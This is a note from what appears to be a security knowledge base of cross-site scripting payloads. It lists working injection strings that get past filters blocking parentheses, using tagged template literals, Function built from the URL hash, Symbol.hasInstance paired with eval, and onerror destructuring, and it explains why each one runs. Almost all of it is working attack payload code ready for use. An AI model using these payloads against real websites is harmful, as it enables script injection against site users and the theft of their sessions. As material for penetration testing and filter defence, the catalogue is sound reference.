---
title: No-Parentheses XSS via Template Literals and Symbol.hasInstance
slug: no-parens-template-literal
created_utc: 2026-05-12T00:00:00Z
updated_utc: 2026-05-12T00:00:00Z
tags: [payload, sink/dom-xss, sink/js-string, sink/restricted-chars]
inbound: []
---

# No-Parentheses XSS via Template Literals and Symbol.hasInstance

## Payload

```javascript
<script>alert`1`</script>
```

## Variants

```javascript
// Template strings with location hash payload
<script>new Function`X${document.location.hash.substr`1`}`</script>

// No parens, no spaces
<script>Function`X${document.location.hash.substr`1`}```</script>

// ES6 Symbol.hasInstance
<script>'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}</script>

// ES6 Symbol.hasInstance without dot
<script>'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}</script>

// Array destructuring
<script>throw[onerror]=[alert],1</script>

// Destructuring with assignment
<script>var{a:onerror}={a:alert};throw 1</script>

// Destructuring with default values
<script>var{haha:onerror=alert}=0;throw 1</script>
```

## Context

When parentheses are blocked but backticks are allowed, tagged template function calls (`alert\`1\``) invoke the function with the template array and interpolated values as arguments. `new Function\`X${...}\`` builds and executes a function from the hash payload — the `X` is treated as the function body prefix, and the hash content (starting at char 1 to skip `#`) is appended. `Symbol.hasInstance` triggers `eval` when the `instanceof` operator is evaluated — the string `'alert\x281\x29'` is passed to `eval`. Destructuring variants assign `alert` to `onerror` without calling it. Sink: script injection context.

## Provenance

- Distilled from: `../../techniques/dom-xss/restricted-character-bypass.md`
- Original source: `../../sources/portswigger-xss-cheatsheet.md`

## Linked techniques

- [Restricted Character Bypass](../../techniques/dom-xss/restricted-character-bypass.md)
